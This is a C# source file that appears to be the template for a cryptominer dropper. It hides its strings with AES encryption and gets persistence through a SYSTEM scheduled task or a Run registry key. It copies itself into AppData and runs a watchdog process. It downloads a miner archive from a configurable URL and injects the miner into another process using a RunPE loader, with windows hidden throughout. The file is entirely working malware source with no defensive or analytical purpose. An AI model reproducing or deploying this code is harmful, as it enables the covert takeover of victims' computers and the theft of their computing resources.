using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Management;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Linq;
using Microsoft.Win32;
#if DefDebug
using System.Windows.Forms;
#endif

#if DefAssembly
[assembly: AssemblyTitle("%Title%")]
[assembly: AssemblyDescription("%Description%")]
[assembly: AssemblyCompany("%Company%")]
[assembly: AssemblyProduct("%Product%")]
[assembly: AssemblyCopyright("%Copyright%")]
[assembly: AssemblyTrademark("%Trademark%")]
[assembly: AssemblyFileVersion("%v1%" + "." + "%v2%" + "." + "%v3%" + "." + "%v4%")]
#endif
[assembly: Guid("%Guid%")]

public partial class Program
{
    public static string rbD = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\" + RGetString("#LIBSPATH");
#if DefInstall
    public static string rplp = PayloadPath;
#endif

    public static void Main()
    {
#if DefInstall
        try{
            Thread.Sleep(2 * 1000);
            if(new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
            {
                try{
                    Process.Start(new ProcessStartInfo
                    {
                        FileName = "cmd",
                        Arguments = RGetString("#TASKSCH") + "\"" + Path.GetFileNameWithoutExtension(rplp) + "\"" + " /tr " + "'" + "\"" + (rplp) + "\"" + "' /RU \"SYSTEM\" & exit",
                        WindowStyle = ProcessWindowStyle.Hidden,
                        CreateNoWindow = true,
                        Verb = "runas"
                    });
                }
                catch(Exception ex){
                Registry.CurrentUser.CreateSubKey(RGetString("#REGKEY")).SetValue(Path.GetFileName(rplp), rplp);
#if DefDebug
                MessageBox.Show("M1: " + Environment.NewLine + ex.ToString());
#endif
                }
            }else{
                Registry.CurrentUser.CreateSubKey(RGetString("#REGKEY")).SetValue(Path.GetFileName(rplp), rplp);
            }
        }
        catch(Exception ex){
#if DefDebug
            MessageBox.Show("M2: " +ex.ToString());
#endif
        }
        RInstall();
#endif
        RInitialize();
    }

#if DefInstall
    public static void RInstall()
    {
        Thread.Sleep(2 * 1000);
        if (Process.GetCurrentProcess().MainModule.FileName != rplp)
        {
            foreach (Process proc in Process.GetProcessesByName(RGetString("#WATCHDOG")))
            {
                proc.Kill();
            }

            try
            {
                File.Delete(Path.Combine(rbD, RGetString("#WATCHDOG") + ".log"));
            } catch(Exception ex) {}

            File.Copy(Process.GetCurrentProcess().MainModule.FileName, rplp, true);
            Thread.Sleep(5 * 1000);
            RBaseFolder();
            Directory.CreateDirectory(Path.GetDirectoryName(rplp));
            Process.Start(new ProcessStartInfo
            {
                FileName = rplp,
                WorkingDirectory = Path.GetDirectoryName(rplp),  
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
            });
            Environment.Exit(0);
        }
    }
#endif

    public static byte[] RGetTheResource(string rarg1)
    {
        var MyResource = new System.Resources.ResourceManager("#ParentRes", Assembly.GetExecutingAssembly());
        return RAES_Method((byte[])MyResource.GetObject(rarg1));
    }

    public static string RGetString(string rarg1)
    {
        return Encoding.ASCII.GetString(RAES_Method(Convert.FromBase64String(rarg1)));
    }

    public static void RRun(byte[] rarg1, string rarg2, byte[] rarg3)
    {
        // Credits gigajew for RunPE https://github.com/gigajew/Mandark
        Assembly.Load(rarg1).GetType(RGetString("#DLLSTR")).GetMethod(RGetString("#DLLOAD"), BindingFlags.Public | BindingFlags.Static).Invoke(null, new object[] { rarg3, ("#InjectionDir") + @"\" + RGetString("#InjectionTarget"), rarg2 });
    }

    public static void RBaseFolder()
    {
        try
        {
#if DefInstall
            Directory.CreateDirectory(rbD);
#endif
#if DefWatchdog
            if (Process.GetProcessesByName(RGetString("#WATCHDOG")).Length < 1)
            {
                File.WriteAllBytes(rbD + RGetString("#WATCHDOG") + ".exe", RGetTheResource("#watchdog"));

                Process.Start(new ProcessStartInfo
                {
                    FileName = Path.Combine(rbD, RGetString("#WATCHDOG") + ".exe"),
                    WorkingDirectory = rbD,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                });
            }
#endif
        }
        catch (Exception ex)
        {
#if DefDebug
            MessageBox.Show("M3: " + Environment.NewLine + ex.ToString());
#endif
        }
    }

    public static bool RCheckProc()
    {
        try
        {
            var options = new ConnectionOptions();
            options.Impersonation = ImpersonationLevel.Impersonate;
            var scope = new ManagementScope(@"\\" + Environment.UserDomainName + @"\root\cimv2", options);
            scope.Connect();

            string wmiQuery = string.Format("Select CommandLine from Win32_Process where Name='{0}'", RGetString("#InjectionTarget"));
            var query = new ObjectQuery(wmiQuery);
            var managementObjectSearcher = new ManagementObjectSearcher(scope, query);
            var managementObjectCollection = managementObjectSearcher.Get();
            foreach (ManagementObject retObject in managementObjectCollection)
            {
                if (retObject != null && retObject["CommandLine"] != null && retObject["CommandLine"].ToString().Contains("--cinit-find-e"))
                {
                    return true;
                }
            }
        }
        catch (Exception ex)
        {
#if DefDebug
            MessageBox.Show("M4: " + Environment.NewLine + ex.ToString());
#endif
        }
        return false;
    }

    public static void RInitialize()
    {
        try
        {
            RBaseFolder();

            System.Net.ServicePointManager.SecurityProtocol = System.Net.SecurityProtocolType.Tls | System.Net.SecurityProtocolType.Tls11 | System.Net.SecurityProtocolType.Tls12;

            if (RCheckProc())
            {
                Environment.Exit(0);
            }

            byte[] reT = { };

#if DefDownloader
            if (!File.Exists(Path.Combine(rbD, RGetString("#WATCHDOG") + ".log")))
            {
                using (var client = new System.Net.WebClient())
                {
                    reT = client.DownloadData(RGetString("#MINERURL"));
                }
#if DefInstall
                File.WriteAllBytes(Path.Combine(rbD, RGetString("#WATCHDOG") + ".log"), RAES_Method(reT, true));
#endif
            }
            else
            {
                reT = RAES_Method(File.ReadAllBytes(Path.Combine(rbD, RGetString("#WATCHDOG") + ".log")));
            }
#else
            reT = RGetTheResource("#eth");
#endif

            try
            {
                using (var archive = new ZipArchive(new MemoryStream(reT)))
                {
                    foreach (ZipArchiveEntry entry in archive.Entries)
                    {
                        if (entry.FullName.Contains("et"))
                        {
                            using (var streamdata = entry.Open())
                            {
                                using (var ms = new MemoryStream())
                                {
                                    streamdata.CopyTo(ms);
                                    RRun(RGetTheResource("#dll"), RGetString("#ARGSTR"), ms.ToArray());
                                }
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
#if DefDebug
            MessageBox.Show("M5: " + Environment.NewLine + ex.ToString());
#endif
            }
        }
        catch (Exception ex)
        {
#if DefDebug
            MessageBox.Show("M6: " + Environment.NewLine + ex.ToString());
#endif
        }
    }

    public static byte[] RAES_Method(byte[] rarg1, bool rarg2 = false)
    {
        var initVectorBytes = Encoding.ASCII.GetBytes("#IV");
        var saltValueBytes = Encoding.ASCII.GetBytes("#SALT");
        var k1 = new Rfc2898DeriveBytes("#KEY", saltValueBytes, 100);
        var symmetricKey = new RijndaelManaged();
        symmetricKey.KeySize = 256;
        symmetricKey.Mode = CipherMode.CBC;
        var encryption = rarg2 ? symmetricKey.CreateEncryptor(k1.GetBytes(16), initVectorBytes) : symmetricKey.CreateDecryptor(k1.GetBytes(16), initVectorBytes);
        using (var mStream = new MemoryStream())
        {
            using (var cStream = new CryptoStream(mStream, encryption, CryptoStreamMode.Write))
            {
                cStream.Write(rarg1, 0, rarg1.Length);
                cStream.Close();
            }

            return mStream.ToArray();
        }
    }
}